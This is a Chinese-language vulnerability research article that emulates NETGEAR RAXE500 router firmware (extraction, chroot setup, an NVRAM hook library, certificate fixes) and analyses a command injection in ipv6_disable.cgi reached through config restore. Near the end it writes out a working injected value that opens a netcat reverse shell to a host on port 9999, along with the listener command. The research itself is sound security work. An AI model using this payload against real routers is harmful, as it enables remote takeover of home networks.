#  NETGEAR 路由器环境模拟与漏洞分析  
易之生生
                    易之生生  看雪学苑   2026-01-20 09:59  
  
**0****1**  
  
**环境配置**  
  
## 版本 :Nighthawk AX12 RAXE500 V1.2.14.114_2.0.67  
  
首先 binwalk -e1 RAXE500-V1.2.14.114_2.0.67.chk 解压固件。  
  
```
# binwalk -e1 RAXE500-V1.2.14.114_2.0.67.chkDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------58            0x3A            Flattened device tree, size:969 bytes, version:171030          0x406           Flattened device tree, size:9970 bytes, version:1742870         0xA776          CRC32 polynomial table, little endian703534        0xABC2E         CRC32 polynomial table, little endianWARNING:Extractor.execute failed to run external extractor 'lzop -f -d '%e'': [Errno 2] No such file or directory:'lzop', 'lzop -f -d '%e'' might not be installed correctly761969        0xBA071         LZO compressed data836250        0xCC29A         HTML document header836500        0xCC394         HTML document footer836532        0xCC3B4         HTML document header837187        0xCC643         HTML document footer837211        0xCC65B         HTML document header838626        0xCCBE2         HTML document footer838650        0xCCBFA         HTML document header839246        0xCCE4E         HTML document footer957782        0xE9D56         Flattened device tree, size:5913 bytes, version:17963698        0xEB472         LZMA compressed data, properties:0x5D, dictionary size:8388608 bytes, uncompressed size:-1 bytes4587594       0x46004A        Flattened device tree, size:49513 bytes, version:174637110       0x46C1B6        Flattened device tree, size:49513 bytes, version:174686626       0x478322        Flattened device tree, size:47694 bytes, version:174734322       0x483D72        Flattened device tree, size:50144 bytes, version:174784466       0x490152        Flattened device tree, size:50144 bytes, version:174834610       0x49C532        Flattened device tree, size:49601 bytes, version:174884214       0x4A86F6        Flattened device tree, size:49633 bytes, version:174933850       0x4B48DA        Flattened device tree, size:49557 bytes, version:174983410       0x4C0A72        Flattened device tree, size:49677 bytes, version:175033090       0x4CCC82        Flattened device tree, size:47733 bytes, version:175080826       0x4D86FA        Flattened device tree, size:48647 bytes, version:175129474       0x4E4502        Flattened device tree, size:48802 bytes, version:175178278       0x4F03A6        Flattened device tree, size:48802 bytes, version:175227082       0x4FC24A        Flattened device tree, size:48767 bytes, version:175275850       0x5080CA        Flattened device tree, size:48767 bytes, version:175324618       0x513F4A        Flattened device tree, size:48767 bytes, version:175373386       0x51FDCA        Flattened device tree, size:50605 bytes, version:175423994       0x52C37A        Flattened device tree, size:50605 bytes, version:175474602       0x53892A        Flattened device tree, size:50412 bytes, version:175525014       0x544E16        Squashfs filesystem, little endian, version 4.0, compression:xz, size:78884152 bytes, 3245 inodes, blocksize:131072 bytes, created:2025-05-16 08:07:54
```  
  
  
  
进入 squashfs-root 目录,运行 sudo chroot . bin/sh 进入固件环境。  
  
```
# sudo chroot . bin/shBusyBox v1.31.1 (2025-05-16 15:16:50 CST) built-in shell (ash)Enter 'help' for a list of built-in commands.# ls -ladrwxrwxrwx   22 1000     1000          4096 May 16  2025 .drwxrwxrwx   22 1000     1000          4096 May 16  2025 ..-rw-r--r--    1 1000     1000             0 May 16  2025 .init_enable_coredrwxr-xr-x    2 1000     1000          4096 May 16  2025 bindrwxrwxr-x    3 1000     1000          4096 May 16  2025 datalrwxrwxrwx    1 1000     1000            16 May 16  2025 debug -> sys/kernel/debugdrwxrwxr-x    3 1000     1000          4096 May 16  2025 devdrwxr-xr-x   20 1000     1000          4096 May 16  2025 etcdrwxrwxr-x    3 1000     1000          4096 May 16  2025 homedrwxrwxr-x    2 1000     1000          4096 May 16  2025 includedrwxrwxr-x    6 1000     1000         20480 May 16  2025 libdrwxrwxr-x    3 1000     1000          4096 May 16  2025 lib64drwxr-xr-x    2 1000     1000          4096 May 16  2025 misc2drwxr-xr-x    2 1000     1000          4096 May 16  2025 misc3drwxrwxr-x    2 1000     1000          4096 May 16  2025 mntdrwxrwxr-x    9 1000     1000          4096 May 16  2025 optdrwxrwxr-x    2 1000     1000          4096 May 16  2025 procdrwxr-xr-x    2 1000     1000          4096 May 16  2025 sbindrwxr-xr-x    6 1000     1000          4096 May 16  2025 sharedrwxrwxr-x    3 1000     1000          4096 May 16  2025 syslrwxrwxrwx    1 1000     1000             8 May 16  2025 tmp -> /var/tmpdrwxr-xr-x   10 1000     1000          4096 May 16  2025 usrdrwxrwxr-x    2 1000     1000          4096 May 16  2025 vardrwxrwxr-x    3 1000     1000          4096 May 16  2025 websdrwxr-xr-x   11 1000     1000         32768 May 16  2025 www#
```  
  
  
  
直接运行 usr/sbin/httpd 报错，需要根据 etc/init.d/mount-fs.sh 的脚本命令创建目录运行环境。  
  
```
# usr/sbin/httpdlibacos_debug_log build time:Feb 17 2022 18:15:22****shared_debug_log_init(82): Open shm for shm httpd_httpd_mt fail, create it.libhttpd build time:Jan 11 2024 09:55:00/tmp/shm_id opened error!
```  
  
  
  
创建目录环境命令:  
  
```
# mkdir -p /var/log /var/run /var/state/dhcp /var/ppp /var/udhcpd /var/zebra /var/siproxd /var/cache /var/tmp /var/samba /var/samba/share /var/samba/homes /var/samba/private /var/samba/locks
```  
  
  
  
再次运行报错，需要将 /tmp/shm_id 的值修改为0:  
  
```
# usr/sbin/httpdlibacos_debug_log build time:Feb 17 2022 18:15:22****shared_debug_log_init(82): Open shm for shm httpd_httpd_mt fail, create it.libhttpd build time:Jan 11 2024 09:55:00segment_id:5 , in /tmp/shm_id.Get a incorrect Segment_ID:5 and semaphore ID:-1something wrong in getting shm_id.
```  
  
  
  
之后再次运行报错:  
  
```
# usr/sbin/httpdlibacos_debug_log build time: Feb 17 2022 18:15:22****shared_debug_log_init(82): Open shm for shm httpd_httpd_mt fail, create it.libhttpd build time: Jan 11 2024 09:55:00segment_id: 0 , in /tmp/shm_id. Get a correct Segment_ID: 0 and semaphore ID:0Can't find handler for ASP command: wlg_cgi_get_isolation_status(0);Can't find handler for ASP command: wlg_cgi_get_isolation_status(1);Can't find handler for ASP command: wlg_cgi_get_isolation_status(2);Can't find handler for ASP command: genie_cgi_need_to_load_basic();Can't find handler for ASP command: guiCgiInternetStatusGetParam_XUNYOU();Can't find handler for ASP command: basic_cgi_get_cur_choice_nvram("wan_proto");Can't find handler for ASP command: eco_get_redirect_link();Can't find handler for ASP command: attached_devices_cgi_edit_name("ip")Can't find handler for ASP command: attached_devices_cgi_edit_name("mac")Can't find handler for ASP command: attached_devices_cgi_edit_name("model")Can't find handler for ASP command: attached_devices_cgi_edit_name("name")Can't find handler for ASP command: attached_devices_cgi_edit_name("type")Can't find handler for ASP command: attached_devices_cgi_edit_name("conndevice")Can't find handler for ASP command: wlg_cgi_get_isolation_status();Can't find handler for ASP command: qos_cgi_get_bandwidth("ToSet_qos_bw_uplink");Can't find handler for ASP command: qos_cgi_support_qos_down_streaming();Can't find handler for ASP command: qos_cgi_get_bandwidth("AlertMessage");Can't find handler for ASP command: qos_cgi_get_bandwidth();Can't find handler for ASP command: qos_cgi_get_mac();Can't find handler for ASP command: qos_cgi_get_custom_table();Can't find handler for ASP command: qos_cgi_get_custom_hidden_table();Can't find handler for ASP command: cdl_cgi_set_hijack(1);Can't find handler for ASP command: genie_cgi_get_client_type();Can't find handler for ASP command: 13Can't find handler for ASP command: wlh_cgi_get_5g2presetssid();Can't find handler for ASP command: genie_get_5g_2_wireless_security_key();Can't find handler for ASP command: cdl_cgi_set_hijack(0);Can't find handler for ASP command: check_is_index()Can't find handler for ASP command: gui_get_opmode_param("pre_mode");Can't find handler for ASP command: isPortTrunking("is_ptk_start");Can't find handler for ASP command: isPortTrunking("is_ptk_end");# can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!dil initis_no_boarddata():can't open file /misc2/.bd_dataadd active user:, sessionId:0x0, cookie:0usr/sbin/httpd(pid=4777) is calling shared_acos_nvram_commit:httpd: socket bound in 255.255.255.255:9443.httpd: ipv6 socket bound in 80.Can't open device file: /dev/spiv6qemu: uncaught target signal 11 (Segmentation fault) - core dumped
```  
  
##   
  
**02******  
  
**证书配置**  
  
  
GDB 调试发现 tmp_h_c 的值为空，代码如下:  
  
![CERT CODE](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJcRTUJcFvLIIINQ2pTicxpoTVU7RBuw4CNicGwhqeFThcicIFATsyNN0RQ/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
分析代码，需要添加启动参数: /usr/sbin/httpd -E /usr/sbin/ca.pem /usr/sbin/httpsd.pem  
  
![CERT CODE](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJyKFgjlHdl2HSibuI2tIibdTvKK1VbwMYhjv9ec4vMibYSYM9T7FtcXZibw/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
再次运行提示生成证书失败:  
  
```
# /usr/sbin/httpd -E /usr/sbin/ca.pem /usr/sbin/httpsd.pemlibacos_debug_log build time:Feb 17 2022 18:15:22****shared_debug_log_init(82): Open shm for shm httpd_httpd_mt fail, create it.libhttpd build time:Jan 11 2024 09:55:00Generating a RSA private keyError Generating Key1082140528:error:0E06D06C:lib(14):func(109):reason(108):NA:0:group=req name=default_bits1082140528:error:2406C06E:lib(36):func(108):reason(110):NA:0:1082140528:error:2406C06E:lib(36):func(108):reason(110):NA:0:1082140528:error:2406B072:lib(36):func(107):reason(114):NA:0:1082140528:error:2406C06E:lib(36):func(108):reason(110):NA:0:1082140528:error:2406C06E:lib(36):func(108):reason(110):NA:0:1082140528:error:2406B072:lib(36):func(107):reason(114):NA:0:1082140528:error:2406C06E:lib(36):func(108):reason(110):NA:0:1082140528:error:2406B072:lib(36):func(107):reason(114):NA:0:1082140528:error:04081003:lib(4):func(129):reason(3):NA:0:
```  
  
  
  
查看 /dev/ 下的设备，因为没有 /dev/random 和 /dev/urandom 导致熵不足引起的，需要将主机的 dev 设备映射到固件目录:  
  
```
# sudo mount -o bind /dev ./dev/
```  
  
  
  
再次运行就成功了  
  
```
# /usr/sbin/httpd -E /usr/sbin/ca.pem /usr/sbin/httpsd.pemlibacos_debug_log build time: Feb 17 2022 18:15:22libhttpd build time: Jan 11 2024 09:55:00Generating a RSA private key................................................+++++..............+++++writing new private key to '/tmp/h.k'-----read_board_data():can't open file /misc2/.bd_dataread_board_data():can't open file /misc2/.bd_dataread_board_data():can't open file /misc2/.bd_data/usr/sbin/httpd(pid=5128) is calling shared_acos_nvram_commit:segment_id: 0 , in /tmp/shm_id. Get a correct Segment_ID: 0 and semaphore ID:0Can't find handler for ASP command: wlg_cgi_get_isolation_status(0);Can't find handler for ASP command: wlg_cgi_get_isolation_status(1);Can't find handler for ASP command: wlg_cgi_get_isolation_status(2);Can't find handler for ASP command: genie_cgi_need_to_load_basic();Can't find handler for ASP command: guiCgiInternetStatusGetParam_XUNYOU();Can't find handler for ASP command: basic_cgi_get_cur_choice_nvram("wan_proto");Can't find handler for ASP command: eco_get_redirect_link();Can't find handler for ASP command: attached_devices_cgi_edit_name("ip")Can't find handler for ASP command: attached_devices_cgi_edit_name("mac")Can't find handler for ASP command: attached_devices_cgi_edit_name("model")Can't find handler for ASP command: attached_devices_cgi_edit_name("name")Can't find handler for ASP command: attached_devices_cgi_edit_name("type")Can't find handler for ASP command: attached_devices_cgi_edit_name("conndevice")Can't find handler for ASP command: wlg_cgi_get_isolation_status();Can't find handler for ASP command: qos_cgi_get_bandwidth("ToSet_qos_bw_uplink");Can't find handler for ASP command: qos_cgi_support_qos_down_streaming();Can't find handler for ASP command: qos_cgi_get_bandwidth("AlertMessage");Can't find handler for ASP command: qos_cgi_get_bandwidth();Can't find handler for ASP command: qos_cgi_get_mac();Can't find handler for ASP command: qos_cgi_get_custom_table();Can't find handler for ASP command: qos_cgi_get_custom_hidden_table();Can't find handler for ASP command: cdl_cgi_set_hijack(1);Can't find handler for ASP command: genie_cgi_get_client_type();Can't find handler for ASP command: 13Can't find handler for ASP command: wlh_cgi_get_5g2presetssid();Can't find handler for ASP command: genie_get_5g_2_wireless_security_key();Can't find handler for ASP command: cdl_cgi_set_hijack(0);Can't find handler for ASP command: check_is_index()Can't find handler for ASP command: gui_get_opmode_param("pre_mode");Can't find handler for ASP command: isPortTrunking("is_ptk_start");Can't find handler for ASP command: isPortTrunking("is_ptk_end");# can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!can't open mtd file!!dil initis_no_boarddata():can't open file /misc2/.bd_dataadd active user:, sessionId:0x0, cookie:0/usr/sbin/httpd(pid=5145) is calling shared_acos_nvram_commit:httpd: socket bound in 255.255.255.255:9443.httpd: ipv6 socket bound in 80.Can't open device file: /dev/spiv6cert file /tmp/h.c, key file /tmp/h.k>>> start to launch lighttpdkillall: lighttpd: no process killed2025-12-12 08:00:39: (network.c.578) bind() 0.0.0.0:443: Address already in use
```  
  
##   
  
**03******  
  
**NVRAM模拟**  
  
  
虽然 HTTPD 的服务运行成功了，但是网页无法访问，访问的提示如下:  
  
```
 is_no_boarddata():can't open file /misc2/.bd_dataadd active user:, sessionId:0x0, cookie:0/usr/sbin/httpd(pid=5145) is calling shared_acos_nvram_commit:httpd: socket bound in 255.255.255.255:9443.httpd: ipv6 socket bound in 80.Can't open device file: /dev/spiv6cert file /tmp/h.c, key file /tmp/h.k>>> start to launch lighttpdkillall: lighttpd: no process killed2025-12-12 08:00:39: (network.c.578) bind() 0.0.0.0:443: Address already in use===> parse_http_request(3103) isToRouter = 0:return===> parse_http_request(3103) isToRouter = 0:return===> parse_http_request(3103) isToRouter = 0:return===> parse_http_request(3103) isToRouter = 0:return===> parse_http_request(3103) isToRouter = 0:return===> parse_http_request(3103) isToRouter = 0:return===> parse_http_request(3103) isToRouter = 0:return===> parse_http_request(3103) isToRouter = 0:return===> parse_http_request(3103) isToRouter = 0:return===> parse_http_request(3103) isToRouter = 0:return
```  
  
  
  
对应的代码如下:  
  
![NVRAM CODE](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJfYGrZLDo6es6KtEjmAtKE1NsRzy6s2ibe9z0xX716B8Xzr1j4AA4Q8g/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
需要从 NVRAM 读取 ddns_hostname 的值，现在需要一个 nvram.ini 文件，和一个模拟 acosNvramConfig_* 的 SO。  
  
  
在 GITHUB 上有一个 libnvram_faker/conf/netgear/nvram.ini 的配置文件，然后通过 HOOK 来模拟以下的函数:  
  
![NVRAM HOOK](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJ0rAo8FsUJF63auyUMp92zRqGl0bdksk6SMm13ah7ay8S3fY98iapNHw/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
HOOK acosNvramConfig 的 acosNvramConfig.c 代码如下:  
  
```
#include <stdio.h>#include <stdlib.h>#include <string.h>#include <ctype.h>#include <stdbool.h>#include <errno.h>// 假设配置文件路径#define ROUTE_CONFIG_PATH "/tmp/route.cfg"#define MAX_LINE_LENGTH 256#define MAX_KEY_LENGTH 64#define MAX_VALUE_LENGTH 128// 函数声明char *nvm_get_value(constchar *key);char *nvm_get_value_no_alloc(constchar *key, char *buffer, size_t buffer_size);代码太长，省略...
```  
  
  
  
/tmp/route.cfg 的配置文件如下:  
  
```
fw_spi=1usb_info_dev7=A200396E0402FF83@1@14.4G@U@1@USB_Storage;U:;0;0@http_server_wan_enable=0wifi_mac12=62:c0:02:11:22:33wan_fix_dns=0wifi_wep_on12=0usb_info_dev83=A200396E0402FF83@1@14.4G@U@1@USB_Storage;U:;0;0@wifi_auth_type3=3wan_iptype=Dynamicusb_info_dev8=A200396E0402FF83@1@14.4G@U@1@USB_Storage;U:;0;0@usb_info_dev63=A200396E0402FF83@1@14.4G@U@1@USB_Storage;U:;0;0@wifi_ssid4=NETGEAR_Guest3代码太多，省略...
```  
  
  
  
编译为 acosNvramConfig.so 后放到 lib 目录:  
  
```
# arm-linux-gnueabi-gcc -shared -fPIC acosNvramConfig.c -o acosNvramConfig.so -ldl
```  
  
  
  
需要更新 route.cfg，将 lan_ipaddr=192.168.1.1 修改为本机地址 127.0.0.1，然后运行以下命令:  
  
```
# LD_PRELOAD=acosNvramConfig.so /usr/sbin/httpd -E /usr/sbin/ca.pem /usr/sbin/httpsd.pem
```  
  
  
  
访问 http://127.0.0.1/ 提示以下错误:  
  
```
Device is not authorizied!
```  
  
  
  
报错代码如下:  
  
![BOARD ID](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJ9qC0p2Uv2DVJoSGBlwhBPMBDhl4AZsRKia0VrXbMtrJa6wSwIPib90fw/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
dword_1439FA4 的值来自 is_authorizied() 函数:  
  
![BOARD ID](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJfQNT0hBiaQqKepEp4K9EWU0Q0pjicInueY5zkiaa8san0FibEpSBjya9nQ/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
is_authorizied 函数在 libacos_nvram.so 中，代码如下:  
  
![BOARD ID](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJ1wibpPdWibiaFicdnUYks5NBveIyfPVHNHjy1rVJhDKvbQHq29PlS8yJng/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
功能是取 NVRAM 的 board_id 来与 U12H449 等做比较，搜索 U12H449 选择 U12H449T00_NETGEAR 做为 board_id:  
  
![BOARD ID](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJS1CCibhGN3YTU1qsHTmbf8O48ubF9KULVtbYrGtcu6egqUowxC72ylQ/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
更新 route.cfg 增加 board_id=U12H449T00_NETGEAR 后,访问 http://127.0.0.1/start.htm 成功，但是有时候出现不明原因的 (Segmentation fault) - core dumped:  
  
![START HTML](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJR6s3IaHYHFDn28K57CNicIpolpqojjaN0mtzT4k1rCFDjI2GySnE6BA/640?wx_fmt=other&from=appmsg "")  
![]( "")  
##   
  
**04******  
  
**漏洞分析**  
  
  
在访问 ipv6_disable.cgi 时，有如下的代码:  
  
```
v11 = (constchar *)acosNvramConfig_get((int)"wan_ifname");snprintf(s, 0x80u, "ifconfig %s mtu %d", v11, v9);system(s);
```  
  
  
  
从 NVRAM 中读取了 wan_ifname 的值做为 system 的参数:  
  
![VULNERABILITY CODE](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJSh7b2KtibuXIjQ5Etk3BG7DVA7uiaKxKibvQHPH01ibDyCBW2wPibpibDiajg/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
而 wan_ifname 的值可以通过 https://127.0.0.1/BAK_backup.htm 恢复备份文件的功能来设置:  
  
  
上传文件代码如下:  
  
![RESTORE CODE](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJibErYadRF9mtSLdx8kNetBQmic3tujjUFnT4hR7oBl0HC3Via0PGiaHTBQ/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
![RESTORE CODE](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJOFjfQwVc967vAoY5obtTVasuO0H4uiaDAVaqczQUyyOY2WibhlT7pPqQ/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
libacos_nvram.so 的 shared_acos_nvram_restore_configuration 代码如下:  
  
![RESTORE CODE](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJUkjl3iaeU1ibFaIXlRh528BVuczPlJINa9CJ9KFuGzfrFTq3A1bjn50w/640?wx_fmt=other&from=appmsg "")  
![]( "")  
  
  
恢复配置代码只是一个简单的 CP。  
  
  
修改 route.cfg 文件的 wan_ifname=eth0&rm /tmp/f 2>/dev/null; mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.3.3 9999 > /tmp/f& 进行测试，  
  
  
打开监听端口9999:  
  
```
# nc -lvvp 9999Listening on 0.0.0.0 9999
```  
  
  
  
打开 https://127.0.0.1/IPV6_disable.htm 页面 , 点击 Apply 按钮 ， 就获取到了反弹SHELL:  
  
![IPV6 DISABLE](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJwTe8wMswXUQeRGicZ0PXcNE1VdjuKnsT6QIAaia4Pvq7DnLI6N6f6PYg/640?wx_fmt=other&from=appmsg "")  
  
![]( "")  
  
![REVERSE SHELL](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FMQ0OzsklkBSkZUib6mXygJG0gzib9bOXU92tic0TLas5qcibaVnPxo4FYWBbQSgbhCX55MaB3SibbKUw/640?wx_fmt=other&from=appmsg "")  
![]( "")  
#   
  
##   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FOwWf0VFibBZVeDCDEe0mUBRUAjOv8rkV7AZIg81aM7cUyMtSZ5g0JyIp2g2gvcicLDJmgpjsHZcOw/640?wx_fmt=png&from=appmsg "")  
  
  
看雪ID：  
易之生生  
  
https://bbs.kanxue.com/user-home-920134.htm  
  
*本文为看雪论坛精华文章，由   
易之生生  
   
原创，转载请注明来自看雪社区  
  
[](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458605280&idx=3&sn=b862b079ee38c0e9607690b0574930dc&scene=21#wechat_redirect)  
  
  
  
# 往期推荐  
  
[逆向分析某手游基于异常的内存保护](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458607141&idx=1&sn=4bbcad4c23989173b834046f8852b3b4&scene=21#wechat_redirect)  
  
  
[解决Il2cppapi混淆，通杀DumpUnityCs文件](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606965&idx=1&sn=bf8987b5c86314edd0d5a4a5dd0189dd&scene=21#wechat_redirect)  
  
  
[记录一次Unity加固的探索与实现](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606979&idx=1&sn=e9fdec9d0ff5c4ede515dc302011b74a&scene=21#wechat_redirect)  
  
  
[DLINK路由器命令注入漏洞从1DAY到0DAY](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606963&idx=2&sn=c7265f29dd183dd2b5789254e8d3d979&scene=21#wechat_redirect)  
  
  
[量子安全 quantum ctf Global Hyperlink Zone Hack the box](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606863&idx=1&sn=01fd80bfa67b7c7b26254022f0d11e81&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球在看**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpUHZDmkBpJ4khdIdVhiaSyOkxtAWuxJuTAs8aXISicVVUbxX09b1IWK0g/640?wx_fmt=gif&from=appmsg "")  
  
点击阅读原文查看更多  
  
